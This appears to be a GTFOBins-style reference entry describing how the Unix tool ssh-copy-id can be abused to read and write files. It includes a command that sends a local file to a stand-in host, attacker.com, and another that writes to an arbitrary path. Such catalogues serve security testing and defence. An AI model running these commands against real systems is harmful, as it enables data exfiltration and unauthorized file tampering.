---
type: gtfobin
name: ssh-copy-id
platform: Unix
functions: [file-read, file-write]
tags: [gtfobin, unix, lotl]
---

# ssh-copy-id

## file-read

```bash
ssh-copy-id -f -i /path/to/input-file.pub user@attacker.com
```
_The input file must have the `.pub` file extension. The file will be copied to `~/.ssh/authorized_keys`, otherwise the `-t /path/to/output-file` option can be used._
**Contexts:** sudo, unprivileged

## file-write

```bash
ssh-copy-id -f -i /path/to/input-file.pub -t /path/to/output-file user@host
```
_The input file must have the `.pub` file extension._
**Contexts:** sudo, unprivileged
